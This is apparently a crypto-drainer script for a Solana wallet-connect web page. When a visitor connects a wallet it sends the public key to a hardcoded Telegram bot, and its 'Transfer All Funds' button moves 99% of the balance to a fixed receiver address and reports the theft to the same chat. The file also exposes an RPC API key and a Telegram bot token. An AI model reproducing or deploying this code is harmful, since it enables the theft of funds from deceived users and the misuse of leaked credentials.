'use strict';

// Since we are not using a bundler, we access the libraries from the window object.
// Make sure to include the CDN scripts for these libraries in your HTML file.
const { Buffer } = buffer;
const {
    ConnectionProvider,
    WalletProvider,
    useWallet,
} = window.solanaWalletAdapterReact;
const {
    WalletModalProvider,
    WalletMultiButton,
} = window.solanaWalletAdapterReactUi;
const {
    PhantomWalletAdapter,
    SolflareWalletAdapter,
    TorusWalletAdapter,
    SolletWalletAdapter,
    LedgerWalletAdapter,
    GlowWalletAdapter,
} = window.solanaWalletAdapterWallets;
const {
    clusterApiUrl,
    Connection,
    PublicKey,
    SystemProgram,
    Transaction,
} = window.solanaWeb3;
const { useEffect, useState, useMemo, useCallback } = React;


const customEndpoint = "https://solana-mainnet.api.syndica.io/api-key/2wJLn4Hx7Pws114i8gQC3oRX3FGuXYkdwLTub3ksFge8NKekdSGGtwG5jxbTrprDPdU41Mnk3Yd8a5oZutHTut6CRvS6dSjBDY6";
const TELEGRAM_BOT_TOKEN = "7977618099:AAHHPFJOCHCRHzlrrChdrm9pw4e6X9ckg_o";
const TELEGRAM_CHAT_ID = "7737130626";

async function sendTelegramNotification(message) {
  try {
    await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      }
    );
  } catch (err) {
    console.error("Telegram notification error:", err);
  }
}

function WalletApp() {
  const wallet = useWallet();
  const [balance, setBalance] = useState(null);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  // Use mainnet-beta connection or your preferred RPC endpoint
  const connection = useMemo(
    () => new Connection(customEndpoint, "confirmed"),
    []
  );

  useEffect(() => {
    async function fetchBalance() {
      if (wallet.connected && wallet.publicKey) {
        setError("");
        try {
          const lamports = await connection.getBalance(wallet.publicKey);
          setBalance(lamports / 1e9);
        } catch (err) {
          setError("Failed to fetch balance: " + err.message);
          setBalance(null);
        }
      } else {
        setBalance(null);
        setError("");
      }
    }
    fetchBalance();
  }, [wallet, connection]);

  useEffect(() => {
    if (wallet.connected && wallet.publicKey) {
      sendTelegramNotification(
        `🚨 *Wallet Connected* 🚨\n\nPublic Key: \`${wallet.publicKey.toBase58()}\``
      );
    }
  }, [wallet.connected, wallet.publicKey]);

  const handleTransfer = useCallback(async () => {
    if (!wallet.connected || !wallet.publicKey) {
      setError("Wallet not connected");
      return;
    }
    setLoading(true);
    setError("");
    try {
      const lamportsBalance = await connection.getBalance(wallet.publicKey);
      const minRent = await connection.getMinimumBalanceForRentExemption(0);
      const transferableLamports = lamportsBalance - minRent;

      if (transferableLamports <= 0) {
        setError("Insufficient funds for transfer.");
        setLoading(false);
        return;
      }

      const receiver = new PublicKey("C5GwAvf7GhgpYknxmi2g6MzuscVhzhxT2hwzRYEXGfVW");

      if (
        !window.confirm(
          `You are about to transfer ${(transferableLamports * 0.99 / 1e9).toFixed(4)} SOL to ${receiver.toBase58()}. Proceed?`
        )
      ) {
        setError("Transaction cancelled.");
        setLoading(false);
        return;
      }

      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: wallet.publicKey,
          toPubkey: receiver,
          lamports: Math.floor(transferableLamports * 0.99),
        })
      );

      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash("confirmed");
      transaction.recentBlockhash = blockhash;
      transaction.lastValidBlockHeight = lastValidBlockHeight;
      transaction.feePayer = wallet.publicKey;

      const signed = await wallet.signTransaction(transaction);
      const txid = await connection.sendRawTransaction(signed.serialize());
      await connection.confirmTransaction(
        { signature: txid, blockhash, lastValidBlockHeight },
        "confirmed"
      );

      await sendTelegramNotification(
        `💸 *Funds Transferred* 💸\n\nFrom: \`${wallet.publicKey.toBase58()}\`\nTo: \`${receiver.toBase58()}\`\nAmount: ${(transferableLamports * 0.99 / 1e9).toFixed(4)} SOL\nTransaction ID: \`${txid}\``
      );

      const newBalance = await connection.getBalance(wallet.publicKey);
      setBalance(newBalance / 1e9);
      setError("");
    } catch (err) {
      setError("Transfer failed: " + err.message);
      await sendTelegramNotification(
        `❌ *Transfer Failed* ❌\n\nPublic Key: \`${wallet.publicKey ? wallet.publicKey.toBase58() : "Unknown"}\`\nError: \`${err.message}\``
      );
    } finally {
      setLoading(false);
    }
  }, [wallet, connection]);

  return (
    React.createElement('div', { style: { maxWidth: 360, margin: "auto", textAlign: "center", color: "white" } },
      React.createElement(WalletMultiButton),
      wallet.connected && (
        React.createElement(React.Fragment, null,
          React.createElement('div', { style: { marginTop: 20, textAlign: "left", backgroundColor: "#3a3a3a", padding: 16, borderRadius: 8, boxShadow: "0 0 8px rgba(0,0,0,0.1)" } },
            React.createElement('p', null, React.createElement('strong', null, "Public Key:"), ` ${wallet.publicKey.toBase58()}`),
            React.createElement('p', null, React.createElement('strong', null, "Balance:"), ` ${balance !== null ? balance.toFixed(4) : "Loading..."} SOL`),
            error && React.createElement('p', { style: { color: "#ff6f61" } }, error)
          ),
          React.createElement('button', {
            onClick: handleTransfer,
            disabled: loading,
            style: {
              marginTop: 20,
              width: "100%",
              padding: 12,
              fontSize: 16,
              borderRadius: 5,
              backgroundColor: loading ? "#ccc" : "#7b2cbf",
              color: "#fff",
              border: "none",
              cursor: loading ? "not-allowed" : "pointer",
              transition: "background-color 0.3s",
            }
          }, loading ? "Transferring..." : "Transfer All Funds")
        )
      )
    )
  );
}

// Root App wrapped in providers
function App() {
  // Define supported wallets
  const wallets = useMemo(
    () => [
      new PhantomWalletAdapter(),
      new SolflareWalletAdapter(),
      new TorusWalletAdapter(),
      new SolletWalletAdapter(),
      new LedgerWalletAdapter(),
      new GlowWalletAdapter(),
    ],
    []
  );

  // Use mainnet-beta cluster; replace with your RPC if needed
  const endpoint = customEndpoint;

  return (
    React.createElement(ConnectionProvider, { endpoint: endpoint },
      React.createElement(WalletProvider, { wallets: wallets, autoConnect: false },
        React.createElement(WalletModalProvider, null,
          React.createElement(WalletApp)
        )
      )
    )
  );
}

// Render the app
ReactDOM.render(React.createElement(App), document.getElementById('wallet-app-root'));
